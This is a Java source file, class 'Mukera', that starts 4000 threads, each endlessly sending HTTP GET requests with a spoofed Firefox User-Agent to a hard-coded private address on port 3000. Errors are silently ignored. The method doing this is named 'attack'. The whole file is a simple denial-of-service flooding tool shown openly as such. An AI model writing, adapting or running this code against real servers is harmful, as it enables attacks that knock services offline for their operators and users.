/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package mukera;

import java.io.File;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Henkok
 */
public class Mukera implements Runnable{
    public URL url;
    private String param;
    public InputStream input;
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        for (int i = 0; i < 4000; i++) {
            new Thread(new Mukera()).start();            
        }
    }
    
    public Mukera() {
        try {
            this.url = new URL("http://192.168.137.156:3000/");
        } catch (MalformedURLException ex) {
            ex.printStackTrace();
        }
    }
    
    
    public void run() {
        while (true) {
            try {
                attack();
            } catch (Exception e) {
            }
        }        
    }          
    public void attack() throws Exception {  
        byte[] aa = new byte[100];
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();            
        connection.setDoOutput(true);            
        connection.setDoInput(true);            
        connection.setRequestMethod("GET");            
        connection.setRequestProperty("charset", "utf-8");            
        connection.setRequestProperty("Host", "localhost");            
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);
        //System.out.println(this + " " + connection.getResponseCode());
        input = connection.getInputStream();   
        connection.connect();        
        System.out.println(input.read(aa));
        
    }     
    
}
